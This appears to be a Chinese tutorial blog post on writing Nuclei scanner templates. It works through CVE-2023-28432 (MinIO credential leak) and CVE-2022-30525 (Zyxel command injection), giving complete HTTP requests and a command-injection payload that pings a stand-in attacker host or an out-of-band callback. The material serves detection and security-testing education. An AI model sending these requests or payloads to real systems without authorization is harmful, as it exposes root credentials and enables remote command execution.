在Web安全测试中，远程漏扫是发现资产漏洞的重要手段，而POC（Proof of Concept）的编写与管理则是漏扫能力的核心。Nuclei作为一款基于模板的快速漏洞扫描框架，凭借其灵活的YAML模板和丰富的协议支持，已成为安全研究人员必备的工具。本文将从理论到实践，深入讲解Nuclei POC的开发流程、YAML语法精髓，并结合两个真实CVE案例，带你掌握如何编写高质量的漏洞检测模板。

---

一、Nuclei与POC开发基础

1.1 什么是Nuclei？

Nuclei是由ProjectDiscovery团队开发的开源漏洞扫描器，它通过YAML模板定义检测规则，支持HTTP、TCP、DNS、File等多种协议。用户只需编写模板，即可批量对目标进行漏洞验证，极大地提高了测试效率。

1.2 POC在远程漏扫中的角色

POC是漏洞检测的“剧本”，它描述了如何发送请求、如何判断响应以确认漏洞存在。在远程漏扫中，POC管理包括：

· 常规漏洞模板：如SQL注入、XSS、命令执行等通用检测。
· 资产识别模板：通过指纹识别确定Web框架、CMS版本等。
· 综合资产模板：结合多种信息提取，完成从发现到验证的闭环。

Nuclei通过社区贡献的数千个模板，覆盖了从高危漏洞到配置缺陷的广泛场景。

---

二、Nuclei模板结构详解（YAML语法）

Nuclei模板采用YAML格式，其核心结构如下：

```yaml
id: 模板唯一标识          # 如 CVE-2023-28432
info:                    # 漏洞信息
  name: 漏洞名称
  author: 作者
  severity: 严重等级      # info, low, medium, high, critical
  description: 描述
  remediation: 修复建议
  reference: 参考链接
  tags: 标签              # 便于分类搜索
http:                    # HTTP请求部分（也可用tcp、dns等）
  - method: GET
    path: "/vulnerable"
    headers: {}
    matchers:            # 匹配规则
      - type: word       # 类型：word、regex、status等
        words:
          - "error"
```

关键字段解析：

· id：必须全局唯一，常用CVE编号或自定义名称。
· info：元数据，用于模板展示和分类。
· 请求块：支持raw原始请求、多步请求、请求条件等。
· matchers：对响应进行匹配，支持and/or条件。
· extractors：从响应中提取信息（如版本号、Token）。

更多细节可参考官方文档：Nuclei模板指南

---

三、开发环境搭建

工欲善其事，必先利其器。推荐使用VSCode配合YAML插件进行模板开发：

1. 安装VSCode：https://code.visualstudio.com/
2. 安装YAML插件：在扩展中搜索“YAML”，安装Red Hat提供的YAML支持插件，可获得语法高亮和自动补全。
3. 安装Nuclei：
   ```bash
   go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
   ```
4. 验证安装：nuclei -version

参考资料：

· Nuclei模板开发文档
· CSDN博客：Nuclei模板编写入门（一）
· CSDN博客：Nuclei模板编写入门（二）

---

四、POC开发流程

一个典型的Nuclei POC开发流程包含以下步骤：

1. 选择目标漏洞：从漏洞库或实际测试中确定需要编写POC的漏洞（如CVE-2023-28432）。
2. 分析漏洞原理：理解漏洞触发点，构造请求和判断条件。
3. 编写模板框架：复制现有模板，修改id和info部分。
4. 构造请求：根据漏洞详情编写raw请求或method+path。
5. 设计匹配规则：使用matchers定义成功标志（关键字、正则、状态码）。
6. 测试与调试：用nuclei -t template.yaml -u target.com测试，根据结果调整。
7. 优化与提交：确保模板通用性强，无误报，可提交至社区。

---

五、实战案例解析

案例1：CVE-2023-28432（MinIO信息泄露）

该漏洞存在于MinIO集群模式，通过/minio/bootstrap/v1/verify接口可未授权获取环境变量（包括root凭证）。

漏洞分析

· 请求：POST /minio/bootstrap/v1/verify
· 响应：若漏洞存在，返回的JSON中包含MINIO_ROOT_USER和MINIO_ROOT_PASSWORD字段。

模板编写

```yaml
id: CVE-2023-28432

info:
  name: MinIO Information Disclosure
  author: xiaodisec
  severity: high
  description: |
    MinIO未经授权的信息泄露漏洞，通过bootstrap接口可获取环境变量。
  reference:
    - https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md
  tags: cve,cve2023,minio,info-disclosure

http:
  - raw:
      - |
        POST /minio/bootstrap/v1/verify HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

    matchers:
      - type: word
        words:
          - "MINIO_ROOT_USER"
          - "MINIO_ROOT_PASSWORD"
        condition: and  # 两个关键词必须同时出现
```

关键点：

· {{Hostname}}会被Nuclei自动替换为目标地址。
· matchers使用word类型，并设置condition: and确保两个字段都存在，避免误报。

案例2：CVE-2022-30525（Zyxel防火墙命令注入）

该漏洞允许未授权用户通过/ztp/cgi-bin/handler接口注入系统命令。

漏洞分析

· 请求：POST /ztp/cgi-bin/handler，JSON格式
· 注入点：mtu字段，可构造; ping -c 3 attacker.com;
· 验证方式：通过DNS交互检测（使用Interactsh）

模板编写

```yaml
id: CVE-2022-30525

info:
  name: Zyxel Firewall Command Injection
  author: remote
  severity: high
  tags: cve,cve2022,zyxel,rce

http:
  - raw:
      - |
        POST /ztp/cgi-bin/handler HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json; charset=utf-8
        
        {"command": "setWanPortSt","proto": "dhcp","port": "1270","vlan_tagged": "1270","vlanid": "1270","mtu": "{{exploit_payload}}","data":""}
    
    payloads:
      exploit_payload:
        - "; ping -c 3 {{interactsh-url}};"
    
    attack: pitchfork  # 多payload组合模式

    matchers:
      - type: word
        part: interactsh_protocol  # 检测Interactsh协议
        name: dns
        words:
          - "dns"
```

关键点：

· payloads定义注入的Payload，其中{{interactsh-url}}是Nuclei自动生成并管理的临时DNS域名。
· attack: pitchfork表示对多个Payload进行组合。
· matchers检测Interactsh返回的协议类型，若收到DNS请求则证明命令执行成功。

---

六、效率工具：Nuclei BurpSuite插件

手动编写YAML模板有时比较耗时，特别是从BurpSuite抓包构造时。官方提供了nuclei-burp-plugin，可直接将Burp中的请求转换为Nuclei模板。

安装与使用

1. 在Burp Suite的BApp商店搜索“Nuclei”并安装。
2. 配置插件：指定Nuclei可执行文件路径。
3. 在任一请求上右键，选择“Send to Nuclei” -> “Generate Template”。
4. 自动生成的模板会包含请求方法和路径，你只需补充info和matchers即可。

插件地址：https://github.com/projectdiscovery/nuclei-burp-plugin

---

七、总结与展望

通过本文的学习，你应该已经掌握了Nuclei POC开发的核心技能：

· 理解YAML模板的结构和语法
· 能够根据漏洞描述编写HTTP请求和匹配规则
· 熟练使用Interactsh进行无回显漏洞检测
· 借助Burp插件快速生成模板原型

POC开发不仅是漏洞验证的技术实现，更是对漏洞本质的深刻理解。随着Nuclei社区的壮大，高质量模板的积累将极大提升安全测试的效率。鼓励你在实际工作中多写、多测、多分享，共同构建更完善的安全检测体系。

---

本文参考资料：

· Nuclei官方文档
· Vulhub漏洞环境
· ProjectDiscovery博客
